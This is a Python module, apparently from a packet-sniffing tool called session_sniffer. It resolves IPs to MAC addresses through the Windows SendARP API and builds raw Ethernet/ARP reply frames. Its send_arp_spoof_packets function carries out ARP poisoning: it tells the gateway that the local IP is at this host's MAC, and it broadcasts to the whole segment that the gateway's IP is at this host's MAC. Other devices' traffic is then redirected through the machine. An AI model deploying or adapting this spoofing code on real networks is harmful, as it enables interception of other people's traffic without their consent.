"""ARP packet construction and MAC address resolution via Windows SendARP API.

This module provides low-level ARP operations for crafting spoofed ARP reply
frames and resolving IP addresses to MAC addresses using the Windows `iphlpapi.dll`.
"""

import ctypes
import socket
import struct
from ctypes import wintypes
from typing import TYPE_CHECKING

from session_sniffer.capture.exceptions import ArpResolutionError
from session_sniffer.logging_setup import get_logger

if TYPE_CHECKING:
    from session_sniffer.capture.pcap import PcapHandle

logger = get_logger(__name__)

# ARP constants
_ARP_HARDWARE_TYPE_ETHERNET = 1
_ARP_PROTOCOL_TYPE_IPV4 = 0x0800
_ARP_HARDWARE_ADDRESS_LENGTH = 6
_ARP_PROTOCOL_ADDRESS_LENGTH = 4
_ARP_OPCODE_REPLY = 2
_ETHERTYPE_ARP = 0x0806

_BROADCAST_MAC = b'\xff\xff\xff\xff\xff\xff'


def _mac_string_to_bytes(mac_string: str) -> bytes:
    """Convert a MAC address string (e.g. `AA:BB:CC:DD:EE:FF`) to 6 raw bytes."""
    return bytes(int(octet, 16) for octet in mac_string.replace('-', ':').split(':'))


def _mac_bytes_to_string(mac_bytes: bytes) -> str:
    """Convert 6 raw MAC bytes to a colon-separated hex string."""
    return ':'.join(f'{byte:02x}' for byte in mac_bytes)


def resolve_mac_address(ip_address: str) -> str:
    """Resolve an IPv4 address to its MAC address using the Windows SendARP API.

    Args:
        ip_address: The target IPv4 address to resolve.

    Returns:
        The resolved MAC address as a colon-separated hex string.

    Raises:
        ArpResolutionError: If the MAC address cannot be resolved.
    """
    try:
        destination_ip = wintypes.DWORD(struct.unpack('!I', socket.inet_aton(ip_address))[0])
    except OSError as exception:
        raise ArpResolutionError(ip_address, f'Invalid IP address: {exception}') from exception

    mac_address_buffer = (ctypes.c_ubyte * 6)()
    mac_address_length = wintypes.DWORD(6)

    iphlpapi = ctypes.windll.iphlpapi
    result = iphlpapi.SendARP(
        destination_ip,
        wintypes.DWORD(0),
        ctypes.byref(mac_address_buffer),
        ctypes.byref(mac_address_length),
    )

    if result:
        raise ArpResolutionError(ip_address, f'SendARP returned error code {result}')

    return _mac_bytes_to_string(bytes(mac_address_buffer))


def build_arp_reply(
    sender_mac: bytes,
    sender_ip: str,
    target_mac: bytes,
    target_ip: str,
) -> bytes:
    """Construct a complete Ethernet + ARP reply frame.

    The resulting 42-byte frame can be sent directly via `PcapHandle.send_packet()`.

    Args:
        sender_mac: 6-byte MAC address of the ARP reply sender (the spoofing host).
        sender_ip: IPv4 address the sender claims to own (the IP being spoofed).
        target_mac: 6-byte MAC address of the ARP reply target (the victim).
        target_ip: IPv4 address of the target machine.

    Returns:
        The raw 42-byte Ethernet + ARP frame.
    """
    sender_ip_bytes = socket.inet_aton(sender_ip)
    target_ip_bytes = socket.inet_aton(target_ip)

    # Ethernet header: dst_mac(6) + src_mac(6) + ethertype(2)
    ethernet_header = struct.pack(
        '!6s6sH',
        target_mac,
        sender_mac,
        _ETHERTYPE_ARP,
    )

    # ARP payload: htype(2) + ptype(2) + hlen(1) + plen(1) + opcode(2)
    #              + sender_mac(6) + sender_ip(4) + target_mac(6) + target_ip(4)
    arp_payload = struct.pack(
        '!HHBBH6s4s6s4s',
        _ARP_HARDWARE_TYPE_ETHERNET,
        _ARP_PROTOCOL_TYPE_IPV4,
        _ARP_HARDWARE_ADDRESS_LENGTH,
        _ARP_PROTOCOL_ADDRESS_LENGTH,
        _ARP_OPCODE_REPLY,
        sender_mac,
        sender_ip_bytes,
        target_mac,
        target_ip_bytes,
    )

    return ethernet_header + arp_payload


def send_arp_spoof_packets(
    pcap_handle: PcapHandle,
    interface_mac: str,
    interface_ip: str,
    gateway_ip: str,
    gateway_mac: str,
) -> None:
    """Send a pair of spoofed ARP replies to redirect traffic through this host.

    Sends two ARP reply frames:
    1. To the gateway: claiming that `interface_ip` is at `interface_mac`
       (so the gateway sends traffic destined for `interface_ip` to this host)
    2. To the target (broadcast): claiming that `gateway_ip` is at `interface_mac`
       (so other devices send traffic destined for the gateway to this host)

    Args:
        pcap_handle: An open pcap handle on the target interface.
        interface_mac: MAC address of the local interface (the spoofing host).
        interface_ip: IP address of the local interface.
        gateway_ip: IP address of the gateway to impersonate.
        gateway_mac: MAC address of the gateway.
    """
    local_mac_bytes = _mac_string_to_bytes(interface_mac)
    gateway_mac_bytes = _mac_string_to_bytes(gateway_mac)

    # Tell the gateway: "interface_ip is at local_mac"
    frame_to_gateway = build_arp_reply(
        sender_mac=local_mac_bytes,
        sender_ip=interface_ip,
        target_mac=gateway_mac_bytes,
        target_ip=gateway_ip,
    )
    pcap_handle.send_packet(frame_to_gateway)

    # Broadcast to network: "gateway_ip is at local_mac"
    frame_to_network = build_arp_reply(
        sender_mac=local_mac_bytes,
        sender_ip=gateway_ip,
        target_mac=_BROADCAST_MAC,
        target_ip='255.255.255.255',
    )
    pcap_handle.send_packet(frame_to_network)
